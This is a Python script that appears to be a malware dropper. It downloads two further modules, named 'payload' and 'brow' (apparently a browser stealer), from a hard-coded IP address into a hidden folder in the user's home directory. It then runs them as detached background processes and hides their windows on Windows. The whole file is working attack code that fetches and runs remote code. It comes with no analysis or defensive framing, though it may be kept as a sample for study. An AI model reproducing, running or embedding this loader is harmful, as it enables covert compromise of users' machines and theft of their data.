'''
This python script downloads 3 more python scripts and spawn child processes for each of them
'''

import platform, os, subprocess, sys

try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

ot = platform.system()
home = os.path.expanduser("~")
sType = "2Team6"

host = f"http://167.88.168.152:1224"

pd = os.path.join(home, ".n2")
ap = pd + "/pay"


def download_payload():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass

    try:
        aa = requests.get(host + "/payload/" + sType, allow_redirects=True)
        with open(ap, "wb") as f:
            f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_payload()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])

if ot == "Darwin":
    sys.exit(-1)

ap = pd + "/bow"


def download_browse():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass
    try:
        aa = requests.get(host + "/brow/" + sType, allow_redirects=True)
        with open(ap, "wb") as f:
            f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_browse()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])
